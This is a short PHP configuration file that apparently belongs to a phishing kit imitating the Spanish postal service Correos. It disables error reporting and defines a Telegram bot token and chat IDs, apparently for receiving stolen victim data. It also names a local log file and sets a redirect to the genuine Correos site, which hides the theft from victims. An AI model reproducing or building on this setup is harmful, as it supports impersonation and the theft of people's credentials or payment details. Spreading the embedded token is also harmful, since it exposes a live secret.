<?php

error_reporting(0);

define("TELEGRAM_TOKEN", "5594701239:AAFxMw7yg1oML07yDuPQ_5lYLPLCNet1Ass");
define("TELEGRAM_CHAT_ID", "603188213");
define("TELEGRAM_CHAT_IDD", "-603188213");
define("TXT_FILE_NAME", 'mjinina.txt');
define("REDIRECT_WEBSITE", "https://www.correos.com/grupo-correos/");



?>